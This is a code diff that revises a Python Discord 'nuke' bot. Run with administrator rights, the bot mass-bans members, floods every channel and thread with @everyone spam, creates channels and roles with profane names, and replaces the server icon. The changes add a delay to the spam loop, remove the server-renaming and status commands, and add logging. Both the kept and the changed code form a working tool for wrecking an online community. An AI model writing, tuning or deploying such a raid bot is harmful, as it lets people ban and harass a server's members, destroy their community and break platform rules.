@@ -22,8 +22,8 @@ if not TOKEN:
 
 @bot.event
 async def on_ready():
-    print(f"[{bot.user}] ULTRA FAST Kieran Nuke Bot Online")
-    await bot.change_presence(activity=discord.Game(name="Kieran Fast Nuke"))
+    print(f"[{bot.user}] Kieran Ultra Nuke Bot Online")
+    await bot.change_presence(activity=discord.Game(name="Kieran Nuke"))
 
 async def set_kieran_icon(guild):
     try:
@@ -45,11 +45,12 @@ async def safe_ban(member):
     except:
         pass
 
-# Ultra fast spam task
-async def spam_task(channel, text, count=80):
-    for _ in range(count):
+# Spam task with 0.4s delay
+async def spam_task(channel, text):
+    for _ in range(50):
         try:
             await channel.send(f"@everyone {text}")
+            await asyncio.sleep(0.4)
         except:
             pass
 
@@ -66,6 +67,7 @@ async def channels(ctx):
             await guild.create_text_channel("fucked-by-kieran", category=cat)
         except:
             pass
+    logging.info("Channels done")
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -77,6 +79,7 @@ async def ban(ctx):
     for member in members:
         if member != guild.owner and member != bot.user and not member.bot:
             await safe_ban(member)
+    logging.info("Ban done")
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -91,63 +94,39 @@ async def roles(ctx):
             await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random())
         except:
             pass
+    logging.info("Roles done")
 
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def spam(ctx, *, text: str = "fucked by Kieran - Protocol Zero"):
     await ctx.message.delete()
     guild = ctx.guild
-    logging.info("Starting ULTRA PARALLEL spam in EVERY channel")
+    logging.info("Starting spam in every channel")
     
     channels_to_spam = guild.text_channels + [thread for thread in guild.threads]
-    
-    # Create spam tasks for ALL channels at once
-    tasks = [spam_task(channel, text, 80) for channel in channels_to_spam]
-    
-    # Run all spam tasks simultaneously
+    tasks = [spam_task(channel, text) for channel in channels_to_spam]
     await asyncio.gather(*tasks, return_exceptions=True)
-    
-    # Extra aggressive round
-    for _ in range(8):
-        extra_tasks = [spam_task(channel, text, 30) for channel in guild.text_channels]
-        await asyncio.gather(*extra_tasks, return_exceptions=True)
-    
-    logging.info("ULTRA FAST parallel spam complete")
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def servername(ctx, *, name: str = "NUKED BY KIERAN"):
-    await ctx.message.delete()
-    try:
-        await ctx.guild.edit(name=name)
-    except:
-        pass
+    logging.info("Spam done")
 
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def nuke(ctx):
     await ctx.message.delete()
-    await ctx.send("🚀 **KIERAN ULTRA FAST NUKE PROTOCOL ACTIVATED**")
+    await ctx.send("🚀 **KIERAN FULL NUKE PROTOCOL ACTIVATED**")
     guild = ctx.guild
     
     await set_kieran_icon(guild)
     
+    # Run everything as fast as possible
     await asyncio.gather(
         roles(ctx),
         channels(ctx),
         ban(ctx),
-        servername(ctx),
         return_exceptions=True
     )
     
     await spam(ctx)
     await ctx.send("@everyone **SERVER FUCKED BY KIERAN**")
-    logging.info("ULTRA FAST NUKE COMPLETE")
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def status(ctx):
-    await ctx.message.delete()
-    await ctx.send(f"**Kieran Fast Nuke Bot Active**\nGuild: {ctx.guild.name}\nMembers: {len(ctx.guild.members)}")
+    logging.info("FULL NUKE COMPLETE")
 
 bot.run(TOKEN)
